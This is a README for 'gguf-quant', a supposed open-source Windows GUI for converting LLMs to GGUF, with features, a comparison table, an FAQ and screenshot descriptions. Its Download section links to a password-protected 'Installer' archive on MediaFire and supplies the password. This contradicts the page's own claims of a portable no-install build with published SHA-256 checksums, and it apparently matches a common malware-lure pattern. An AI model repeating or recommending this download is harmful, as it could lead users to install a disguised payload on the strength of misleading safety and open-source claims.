# gguf-quant

📦 Free, open-source GUI to quantize and convert LLMs to GGUF on Windows — presets, batch queue, VRAM hints. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **One-click quantize** — pick Q4_K_M, Q5_K_M, Q8_0 or any K-quant preset and convert a source model to GGUF
- ✅ **Batch queue** — line up several models and quants; the queue runs overnight with per-job logs
- ✅ **Size and VRAM preview** — estimated file size and required VRAM per quant before a single byte is written
- ✅ **Imatrix support** — optional importance matrix pass for better quality at aggressive quants
- ✅ **Format intake** — reads safetensors and PyTorch checkpoints with a built-in shard merger
- ✅ **Real progress** — tensor-level progress bars from the llama.cpp backend, not a fake spinner
- ✅ **100 MB self-contained exe** — runtime and conversion tools bundled, portable, offline, MIT with SHA-256 releases

## Why gguf-quant

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **gguf-quant** | llama-quantize CLI | LM Studio | HF converters |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free | Free |
| Open source | **Yes** | Yes | No | Partial |
| GUI with quant presets | **Yes** | No | Partial | No |
| Batch queue with logs | **Yes** | Scripted | No | No |
| VRAM estimate per quant | **Yes** | No | No | No |
| Portable, no install | **Yes, 100 MB** | Build from source | Installer | Web or script |

## FAQ

**how to quantize a model to GGUF on Windows?**

The reference path is a Python environment plus a llama.cpp build, which loses an evening for anyone outside the ML shell. gguf-quant wraps the same backend in presets with size and VRAM estimates, so you choose a quant and watch tensor-level progress. It is a 100 MB portable exe, MIT, fully offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark workbench (#121417, cyan #22D3EE): source model card left, quant preset list center with size estimates, VRAM hint chip reading 8.2 GB at 8k context.
2. Batch queue view: three models with per-quant output sizes, progress bars running in parallel, log tail showing tensor names converting.
3. Settings: threads slider, imatrix file picker, output folder with shard naming pattern, success toast reading Q4_K_M written 4.1 GB.

## Download

| Source | Link |
|---|---|
| 💾 **Installer gguf-quant** | [Installer gguf-quant](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).